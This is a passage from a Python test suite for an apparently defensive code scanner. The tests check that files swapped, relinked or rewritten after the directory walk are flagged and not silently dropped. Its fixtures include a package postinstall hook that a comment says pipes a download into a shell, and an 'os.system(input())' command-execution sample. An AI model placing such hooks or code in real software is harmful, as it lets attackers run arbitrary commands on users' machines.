            os.makedirs(os.path.dirname(twin), exist_ok=True)
            self.write(outside, rel, MARKER)
            self.swap(at, twin)
        elif how == "folder":
            os.rename(at, at + ".old")
            os.mkdir(at)
        elif how == "other file":
            shutil.copyfile(at, at + ".new")
            os.replace(at + ".new", at)
        else:
            os.unlink(at)

    def rules(self, out, rel):
        return {(i["rule"], i["sev"]) for i in out["issues"] if i["file"] == rel}


class ReviewTests(_SwapCase):
    """The independent review of LZ-03. H1: a file the walk found and a reader after it reads (the file a postinstall
    runs, a vendored cgo header), swapped after the walk, was treated as absent (its CRITICAL lost, the call complete).
    H2: a file swapped for a folder or a FIFO between the walk's listing and its read was a Q-UNREADABLE note (the gate
    passed). H3: the walk reopened a deep path from the root for every leaf (N²/2 opens on a "comb"), with no depth cap.
    L2: the directory tools checked their target by its path first, following a link swapped in."""

    def test_a_file_a_hook_runs_swapped_after_the_walk_is_not_read(self):
        for name, tool in TOOLS:
            inside, _outside = self.tree()
            self.put(inside, {"package.json": HOOK_PKG, "lib/run.dat": RISKY_JS})
            out = tool({"path": inside})                    # (unswapped: the hook runs a download piped into a shell)
            self.assertEqual(out["qualityGate"], "FAILED")
            self.assertFalse(out.get("incomplete"))
            if name == "scan_directory":
                self.assertIn(("SC-INSTALL-HOOK", "CRITICAL"), self.rules(out, "package.json"))
            for how in self.SWAPS:
                with self.subTest(tool=name, swap=how):
                    inside, outside = self.tree()
                    self.put(inside, {"package.json": HOOK_PKG, "lib/run.dat": RISKY_JS})
                    with self.watching(lambda: self.change(inside, outside, "lib/run.dat", how), when="walked"):
                        out = tool({"path": inside})
                    self.assertNotRead(name, out, os.path.join("lib", "run.dat"))

    def test_a_vendored_header_swapped_after_the_walk_is_not_read(self):
        inside, _outside = self.tree()
        self.put(inside, GO_VENDOR)
        out = server.tool_scan_directory({"path": inside, "include_deps": True, "max_issues": 500})
        header = os.path.join("vendor", "example.com", "v", "v.h")
        self.assertIn(("SC-USE-RISK", "CRITICAL"), self.rules(out, header))
        for how in self.SWAPS:
            with self.subTest(swap=how):
                inside, outside = self.tree()
                self.put(inside, GO_VENDOR)
                with self.watching(lambda: self.change(inside, outside, "vendor/example.com/v/v.h", how),
                                   when="walked"):
                    out = server.tool_scan_directory({"path": inside, "include_deps": True, "max_issues": 500})
                self.assertNotRead("scan_directory", out, header)

    def test_a_folder_a_reader_needs_gone_after_the_walk_is_not_read(self):
        for name, tool in TOOLS:
            with self.subTest(tool=name):
                inside, _outside = self.tree()
                self.put(inside, {"package.json": HOOK_PKG, "lib/run.dat": RISKY_JS})
                with self.watching(lambda: shutil.rmtree(os.path.join(inside, "lib")), when="walked"):
                    out = tool({"path": inside})
                self.assertNotRead(name, out, "lib")

    def test_a_file_swapped_before_its_read_fails_the_gate(self):
        # (package.json swapped right after the walk lists the root, before it reads it: a folder or a FIFO was a
        # Q-UNREADABLE note and the gate passed with the hook's CRITICAL gone)
        kinds = self.SWAPS + (("fifo",) if hasattr(os, "mkfifo") else ())
        for name, tool in TOOLS:
            for how in kinds:
                with self.subTest(tool=name, swap=how):
                    inside, outside = self.tree()
                    self.write(inside, "package.json", GATE_PKG)
                    at = os.path.join(inside, "package.json")

                    def swap():
                        if how == "fifo":
                            os.rename(at, at + ".old")
                            os.mkfifo(at)
                        else:
                            self.change(inside, outside, "package.json", how)
                    with self.watching(swap, after=()):
                        out = tool({"path": inside})
                    self.assertNotRead(name, out, "package.json")
                    self.assertNotIn("Q-UNREADABLE", {i["rule"] for i in out.get("issues", [])})

    def test_a_file_that_cannot_be_read_and_did_not_change_is_still_unreadable(self):
        # (permission denied when the walk lists it and when it opens it: Q-UNREADABLE, INFO, as before; denied and
        # another file by then: it changed)
        real = lazaret._Root._open
        for changed in (False, True):
            with self.subTest(changed=changed):
                inside, outside = self.tree()
                at = os.path.join(inside, "a.py")

                def deny(tree, parts):
                    if parts[-1] == "a.py":
                        if changed:
                            self.change(inside, outside, "a.py", "other file")
                        raise PermissionError(13, "Permission denied")
                    return real(tree, parts)
                with mock.patch.object(lazaret._Root, "_open", deny):
                    out = server.tool_scan_directory({"path": inside})
                if changed:
                    self.assertNotRead("scan_directory", out, "a.py")
                else:
                    self.assertEqual(self.rules(out, "a.py"), {("Q-UNREADABLE", "INFO")})
                    self.assertFalse(out.get("incomplete"))
                self.assertTrue(os.path.exists(at))

    @staticmethod
    def comb(where, depth):
        """where/d/d/…/d (`depth` folders) with a folder z holding b.py beside every d: 2 × depth folders. Made
        beneath each folder's descriptor (a path that long may be longer than the system takes), or by path where
        there is none (Windows)."""
        if not (os.mkdir in os.supports_dir_fd and os.open in os.supports_dir_fd):
            for _ in range(depth):
                os.mkdir(os.path.join(where, "d"))
                os.mkdir(os.path.join(where, "z"))
                with open(os.path.join(where, "z", "b.py"), "wb") as fh:
                    fh.write(b"x = 1\n")
                where = os.path.join(where, "d")
            return
        fd = os.open(where, os.O_RDONLY)
        try:
            for _ in range(depth):
                os.mkdir("d", dir_fd=fd)
                os.mkdir("z", dir_fd=fd)
                z = os.open("z", os.O_RDONLY, dir_fd=fd)
                f = os.open("b.py", os.O_WRONLY | os.O_CREAT, 0o644, dir_fd=z)
                os.write(f, b"x = 1\n")
                os.close(f)
                os.close(z)
                below = os.open("d", os.O_RDONLY, dir_fd=fd)
                os.close(fd)
                fd = below
        finally:
            os.close(fd)

    @unittest.skipUnless(lazaret._ANCHORED_OPEN and os.path.isdir("/proc/self/fd"), "the anchored walk, /proc")
    def test_a_deep_comb_costs_a_bounded_number_of_opens_per_folder(self):
        where = tempfile.mkdtemp(dir=self.base)
        depth = 600
        self.comb(where, depth)
        real_open, real_scandir = os.open, os.scandir
        counts = {"open": 0, "fds": 0}

        def counting_open(*args, **kwargs):
            counts["open"] += 1
            return real_open(*args, **kwargs)

        def sampling_scandir(*args):
            counts["fds"] = max(counts["fds"], len(os.listdir("/proc/self/fd")))
            return real_scandir(*args)
        before = len(os.listdir("/proc/self/fd"))
        for cap in (None, 10 ** 6):                         # (the cap as it is, and lifted: the stride's bound alone)
            with self.subTest(cap=cap or lazaret.MAX_WALK_DEPTH):
                counts.update(open=0, fds=0)
                deepest = min(depth, cap or lazaret.MAX_WALK_DEPTH)
                with mock.patch.object(lazaret, "MAX_WALK_DEPTH", cap or lazaret.MAX_WALK_DEPTH), \
                        mock.patch.object(os, "open", counting_open), mock.patch.object(os, "scandir", sampling_scandir):
                    col = lazaret._collect(where)
                self.assertEqual(len(col["files"]), deepest)
                self.assertLessEqual(counts["open"], 4 * 2 * deepest)          # (the reviewed commit: 180,000 at 600)
                self.assertLessEqual(counts["fds"] - before, 49 if cap is None else 2 + deepest // 16 + 17)
                truncated = sorted(i["file"] for i in col["issues"] if i["rule"] == "SC-TRUNCATED")
                if cap is None:
                    self.assertEqual(truncated, [os.path.join(*["d"] * lazaret.MAX_WALK_DEPTH + [n]) for n in "dz"])
                    self.assertTrue(all("nested deeper than 512 folders" in i["msg"] for i in col["issues"]
                                        if i["rule"] == "SC-TRUNCATED"))
                else:
                    self.assertEqual(truncated, [])
        self.assertEqual(len(os.listdir("/proc/self/fd")), before)

    def test_a_tree_deeper_than_the_cap_is_incomplete(self):
        # (where the tree is read by path (Windows), each folder is lstat'ed along its path, a path as long as the
        # folder is deep: a comb as deep as the cap costs some 10^6 lstats of paths of some 600 characters (and paths
        # longer than Windows takes without its long paths), so the cap is lowered there; the walk is the same)
        cap = lazaret.MAX_WALK_DEPTH if lazaret._ANCHORED_OPEN else 24
        with mock.patch.object(lazaret, "MAX_WALK_DEPTH", cap):
            inside, _outside = self.tree()
            self.comb(os.path.join(inside, "sub"), cap)                     # (sub/d…: cap + 1 deep at its bottom)
            for name, tool in TOOLS:
                with self.subTest(tool=name):
                    out = tool({"path": inside, "max_issues": 2000})
                    self.assertEqual(out["qualityGate"], "FAILED")
                    self.assertTrue(out["incomplete"])
                    self.assertIn(f"2 folders nested deeper than {cap} folders were not read",
                                  out["incompleteReason"])
                    if name == "scan_directory":
                        deep = os.path.join("sub", *["d"] * (cap - 1))
                        self.assertEqual(sorted(i["file"] for i in out["issues"] if i["rule"] == "SC-TRUNCATED"),
                                         [os.path.join(deep, "d"), os.path.join(deep, "z")])

    def test_the_target_is_checked_by_its_open_beneath_the_root(self):
        # (a link swapped in after the check: the same answer whether what it names outside exists or not; a file and
        # a missing path: the tool errors they were)
        for name, tool in TOOLS:
            for target in ("existing", "missing"):
                with self.subTest(tool=name, target=target):
                    inside, outside = self.tree()
                    proj = os.path.join(inside, "proj")
                    os.makedirs(proj)
                    self.write(inside, "proj/app.py", INSIDE)
                    real = server.ToolContext.check_path

                    def check(ctx, p, target=target, outside=outside, proj=proj):
                        got = real(ctx, p)
                        self.swap(proj, os.path.join(outside, "sub") if target == "existing"
                                  else os.path.join(outside, "no_such_folder"))
                        return got
                    with mock.patch.object(server.ToolContext, "check_path", check):
                        out = tool({"path": proj})
                    self.assertTrue(out["incomplete"])
                    self.assertIn("it changed after it was checked", out["incompleteReason"])
            with self.subTest(tool=name, target="a file"):
                inside, _outside = self.tree()
                with self.assertRaisesRegex(ValueError, "^Not a directory: .*a.py$"):
                    tool({"path": os.path.join(inside, "a.py")})
            with self.subTest(tool=name, target="nothing"):
                with self.assertRaisesRegex(ValueError, r"^Not a directory: .*gone \(it does not exist\)$"):
                    tool({"path": os.path.join(inside, "gone")})


RESUME_NFC = "r\u00e9sum\u00e9.dat"                               # résumé.dat, é as one code point (NFC)
RESUME_NFD = unicodedata.normalize("NFD", RESUME_NFC)              # é as e and a combining acute accent (NFD)


class FoldingDiskTests(_SwapCase):
    """LZ-03's re-check, N1: on a disk that takes names differing in case or Unicode form for one (macOS's APFS and
    Windows' NTFS by default), a package's text can name a file the walk listed by another spelling, which the disk
    opens. The after-walk check found the walk's record by the exact name, so a file a hook runs named `LIB/RUN.DAT`
    (on disk lib/run.dat), swapped after the walk, was read as it was then or taken for absent: its CRITICAL lost, the
    call complete. Here the disk is the project's macOS stand-in (tests/_folding_disk.py; the real disk on a Mac).

    On Windows the disk is the real one: the tools read the tree by its real path in its normcase form (lower case),
    which the stand-in's roots, as given, are not. NTFS takes names differing in case for one (its upcase table), but
    not names differing in Unicode form alone: a hook's NFD spelling of an NFC name names nothing there, as on a disk
    that tells names apart (`_one_name`)."""

    SPELLINGS = (("lib/run.dat", "LIB/RUN.DAT", "LIB"),                    # (the file on disk, the hook's name,
                 ("lib/" + RESUME_NFC, "lib/" + RESUME_NFD, "lib"),         # what a swap of lib is reported at)
                 ("lib/" + RESUME_NFC, "LIB/" + RESUME_NFC.upper(), "LIB"))

    @staticmethod
    def _one_name(a, b):
        """Does the disk these tests read take the paths `a` and `b` for one? The stand-in, and macOS's disk, when
        they fold as one in case and Unicode form; Windows' when they are one in upper case, whatever their forms."""
        return a.upper() == b.upper() if os.name == "nt" else apfs_fold(a) == apfs_fold(b)

    def hooked(self, inside, hook, rel):
        pkg = '{"name": "x", "version": "1.0.0", "scripts": {"postinstall": "node %s"}}\n' % hook
        self.put(inside, {"package.json": pkg, rel: RISKY_JS})

    def test_a_file_a_hook_names_by_another_spelling_swapped_after_the_walk_is_not_read(self):
        for rel, hook, folder in self.SPELLINGS:
            reaches = self._one_name(rel, hook)         # (Windows' disk: not the NFD spelling)
            for name, tool in TOOLS:
                inside, _outside = self.tree()
                self.hooked(inside, hook, rel)
                with folding_disk(inside):              # (unswapped: the disk runs lib/run.dat for it)
                    out = tool({"path": inside})
                self.assertEqual(out["qualityGate"], "FAILED")
                self.assertFalse(out.get("incomplete"), out)
                if name == "scan_directory":           # (a hook that runs a file not there: MAJOR, as before N1)
                    self.assertIn(("SC-INSTALL-HOOK", "CRITICAL" if reaches else "MAJOR"),
                                  self.rules(out, "package.json"))
                for how in self.SWAPS + ("its folder for a link",):
                    with self.subTest(file=rel, hook=hook, tool=name, swap=how):
                        inside, outside = self.tree()
                        self.hooked(inside, hook, rel)

                        def swap():
                            if how == "its folder for a link":
                                os.makedirs(os.path.join(outside, "lib"), exist_ok=True)
                                self.write(outside, rel, MARKER)
                                self.swap(os.path.join(inside, "lib"), os.path.join(outside, "lib"))
                            else:
                                self.change(inside, outside, rel, how)
                        with folding_disk(inside), self.watching(swap, when="walked"):
                            out = tool({"path": inside})
                        at = folder if how == "its folder for a link" else hook
                        if reaches:
                            self.assertNotRead(name, out, os.path.join(*at.split("/")))
                        else:                   # (it names nothing, swapped or not: nothing outside is read, and the
                            self.assertEqual(out["qualityGate"], "FAILED")      # hook that runs a file not there
                            if name == "scan_directory":                         # is MAJOR still)
                                self.assertIn(("SC-INSTALL-HOOK", "MAJOR"), self.rules(out, "package.json"))
                            self.assertNothingOutside()

    def test_a_vendored_header_by_another_spelling_swapped_after_the_walk_is_not_read(self):
        vendor = dict(GO_VENDOR, **{"vendor/modules.txt": "# example.com/v v1.0.0\n## explicit\nexample.com/V\n"})
        header = os.path.join("vendor", "example.com", "v", "v.h")
        inside, _outside = self.tree()
        self.put(inside, vendor)
        with folding_disk(inside):
            out = server.tool_scan_directory({"path": inside, "include_deps": True, "max_issues": 500})
        self.assertIn(("SC-USE-RISK", "CRITICAL"), self.rules(out, header))
        for how in self.SWAPS:
            with self.subTest(swap=how):
                inside, outside = self.tree()
                self.put(inside, vendor)
                with folding_disk(inside), \
                        self.watching(lambda: self.change(inside, outside, "vendor/example.com/v/v.h", how),
                                      when="walked"):
                    out = server.tool_scan_directory({"path": inside, "include_deps": True, "max_issues": 500})
                self.assertTrue(out.get("incomplete"), out)
                self.assertNotIn(("SC-USE-RISK", "CRITICAL"), self.rules(out, header))
                self.assertTrue([i for i in out["issues"] if i["rule"] == "SC-TRUNCATED" and CHANGED in i["msg"]])
                self.assertNothingOutside()

    def test_on_a_disk_that_tells_them_apart_another_spelling_names_nothing_as_before(self):
        # (Linux's usual disks: LIB/RUN.DAT is not lib/run.dat, and the hook names a file that is not there, complete,
        # as before N1, whatever happens to lib/run.dat meanwhile; nothing is said to have changed)
        if not tells_names_apart(self.base):
            self.skipTest("this disk takes names differing in case for one")
        for how in (None,) + self.SWAPS:
            with self.subTest(swap=how):
                inside, outside = self.tree()
                self.hooked(inside, "LIB/RUN.DAT", "lib/run.dat")
                with self.watching(how and (lambda: self.change(inside, outside, "lib/run.dat", how)),
                                   when="walked"):
                    out = server.tool_scan_directory({"path": inside})
                self.assertFalse(out.get("incomplete"), out)
                self.assertEqual(self.rules(out, "package.json"), {("SC-INSTALL-HOOK", "MAJOR")})
                self.assertFalse([i for i in out["issues"] if i["rule"] == "SC-TRUNCATED"], out["issues"])
                self.assertNothingOutside()

    def test_a_name_the_disk_reaches_but_the_walk_did_not_list_is_a_change(self):
        # (a file put beside the walk's after it listed the folder, that a hook names: not read as it is then)
        for name, tool in TOOLS:
            with self.subTest(tool=name):
                inside, outside = self.tree()
                self.hooked(inside, "lib/new.dat", "lib/run.dat")
                with self.watching(lambda: self.write(inside, "lib/new.dat", RISKY_JS), when="walked"):
                    out = tool({"path": inside})
                self.assertNotRead(name, out, os.path.join("lib", "new.dat"))

    @unittest.skipUnless(hasattr(os, "mkfifo"), "FIFOs cannot be made here")
    def test_another_entry_the_walk_listed_put_in_the_files_place_is_a_change(self):
        # (LZ-03's re-check 2, N3: the hook's spelling reaches, by inode, another entry the walk listed, renamed or hard
        # linked into the file's place, or the folder replaced by another the walk listed; it was held to that entry
        # under its own name, which then named nothing or no regular file: the CRITICAL lost, the call complete)
        swaps = ("a FIFO renamed in", "a link renamed in", "a hard link to the link", "a hard link to the FIFO",
                 "a hard link to another file", "the folder replaced by another")
        if not _can_hard_link_a_link(self.base):
            swaps = tuple(s for s in swaps if s != "a hard link to the link")
        for name, tool in TOOLS:
            for how in swaps:
                with self.subTest(tool=name, swap=how):
                    inside, _outside = self.tree()
                    self.hooked(inside, "LIB/RUN.DAT", "lib/run.dat")
                    self.put(inside, {"lib/x.txt": INSIDE, "lib/zz/keep.txt": INSIDE, "other/.keep": ""})
                    os.mkfifo(os.path.join(inside, "lib", "pp"))
                    os.symlink(os.path.join("..", "a.py"), os.path.join(inside, "lib", "ln"))
                    lib = os.path.join(inside, "lib")
                    at = os.path.join(lib, "run.dat")

                    def swap():
                        if how == "the folder replaced by another":
                            os.rename(lib, lib + ".old")
                            os.rename(os.path.join(inside, "other"), lib)
                            return
                        os.unlink(at)
                        if how.endswith("renamed in"):
                            os.rename(os.path.join(lib, "pp" if "FIFO" in how else "ln"), at)
                        else:
                            source = {"link": "ln", "FIFO": "pp"}.get(how.rsplit(" ", 1)[-1], "x.txt")
                            os.link(os.path.join(lib, source), at, follow_symlinks=False)
                    with folding_disk(inside), self.watching(swap, when="walked"):
                        out = tool({"path": inside})
                    self.assertNotRead(name, out, "LIB" if how.startswith("the folder") else os.path.join("LIB",
                                                                                                         "RUN.DAT"))

    @unittest.skipUnless(os.path.isdir("/proc/self/fd"), "the stand-in's 8.3 names need /proc (no real disk has them)")
    def test_an_8_3_name_whose_extension_windows_rewrote_is_held_to_the_walks_file(self):
        # (LZ-03's re-check 2, N4: Windows makes run.c++'s short name RUN~1.C__; the alias's extension is not the long
        # one's first letters, so no listed name was one the disk could take it for, and the file gone after the walk
        # read as never there: the CRITICAL lost, the call complete)
        def fold(n):
            n = n.upper()
            return {"RUN~1.C__": "RUN.C++"}.get(n, n)
        inside, _outside = self.tree()
        self.hooked(inside, "lib/RUN~1.C__", "lib/run.c++")
        with folding_disk(inside, fold=fold):
            out = server.tool_scan_directory({"path": inside})
        self.assertFalse(out.get("incomplete"), out)
        self.assertIn(("SC-INSTALL-HOOK", "CRITICAL"), self.rules(out, "package.json"))
        for how in self.SWAPS:
            with self.subTest(swap=how):
                inside, outside = self.tree()
                self.hooked(inside, "lib/RUN~1.C__", "lib/run.c++")
                with folding_disk(inside, fold=fold), \
                        self.watching(lambda: self.change(inside, outside, "lib/run.c++", how), when="walked"):
                    out = server.tool_scan_directory({"path": inside})
                self.assertNotRead("scan_directory", out, os.path.join("lib", "RUN~1.C__"))


class RewrittenFileTests(_SwapCase):
    """LZ-03's re-check 2, N5: the walk held a file to its device and inode alone, so a file deleted and made again
    under its name (ext4 gives it the freed inode) or written in place after the walk was read as it was then: the
    CRITICAL of the file a postinstall runs lost, the call complete, under its exact name. The walk keeps its size and
    times too (core._file_record)."""

    def test_a_file_a_hook_runs_written_again_after_the_walk_is_not_read(self):
        def made_again(at):
            os.unlink(at)
            self.write(os.path.dirname(at), os.path.basename(at), INSIDE)

        def written_in_place(at):
            with open(at, "r+", encoding="utf-8", newline="\n") as fh:
                fh.truncate(0)
                fh.write(INSIDE)

        def same_size_new_time(at):                 # (newline: "\n" alone, as the file was written, its size kept)
            st = os.stat(at)
            with open(at, "r+", encoding="utf-8", newline="\n") as fh:
                fh.write("/" * len(RISKY_JS.rstrip("\n")) + "\n")
            os.utime(at, ns=(st.st_atime_ns, st.st_mtime_ns + 1_000_000_000))
        for name, tool in TOOLS:
            for how in (made_again, written_in_place, same_size_new_time):
                with self.subTest(tool=name, swap=how.__name__):
                    inside, _outside = self.tree()
                    self.put(inside, {"package.json": HOOK_PKG, "lib/run.dat": RISKY_JS})
                    at = os.path.join(inside, "lib", "run.dat")
                    with self.watching(lambda: how(at), when="walked"):
                        out = tool({"path": inside})
                    self.assertNotRead(name, out, os.path.join("lib", "run.dat"))

    def test_an_unchanged_tree_is_complete_as_before(self):
        for name, tool in TOOLS:
            with self.subTest(tool=name):
                inside, _outside = self.tree()
                self.put(inside, {"package.json": HOOK_PKG, "lib/run.dat": RISKY_JS})
                out = tool({"path": inside})
                self.assertFalse(out.get("incomplete"), out)
                self.assertEqual(out["qualityGate"], "FAILED")
                if name == "scan_directory":
                    self.assertIn(("SC-INSTALL-HOOK", "CRITICAL"), self.rules(out, "package.json"))
                    self.assertFalse([i for i in out["issues"] if i["rule"] == "SC-TRUNCATED"], out["issues"])


@unittest.skipUnless(_can_link(), "symbolic links cannot be made here")
class EndToEndTests(unittest.TestCase):
    def test_a_swapped_file_fails_the_call_with_the_real_scanner(self):
        base = tempfile.mkdtemp(prefix="lz-mcp-race-")
        self.addCleanup(shutil.rmtree, base, True)
        inside, outside = os.path.join(base, "inside"), os.path.join(base, "outside")
        os.makedirs(inside)
        os.makedirs(outside)
        path = os.path.join(inside, "app.py")
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(INSIDE)
        with open(os.path.join(outside, "secrets.py"), "w", encoding="utf-8") as fh:
            fh.write("import os\nos.system(input())\n")
        real = server.ToolContext.check_path

        def check(ctx, p):
            got = real(ctx, p)
            os.unlink(path)
            os.symlink(os.path.join(outside, "secrets.py"), path)
            return got
        with mock.patch.dict(os.environ, {"LAZARET_MCP_ROOTS": inside}), \
                mock.patch.object(server.ToolContext, "check_path", check):
            out = server.tool_scan_files({"paths": [path]})
        self.assertEqual(out["files"][path]["rule"], "SC-TRUNCATED")
        self.assertTrue(out["incomplete"])
        self.assertEqual(out["worstSeverity"], "CRITICAL")
        self.assertEqual(out["totalIssues"], 1)
        st = os.lstat(path)
        self.assertTrue(stat.S_ISLNK(st.st_mode))


if __name__ == "__main__":
    unittest.main()
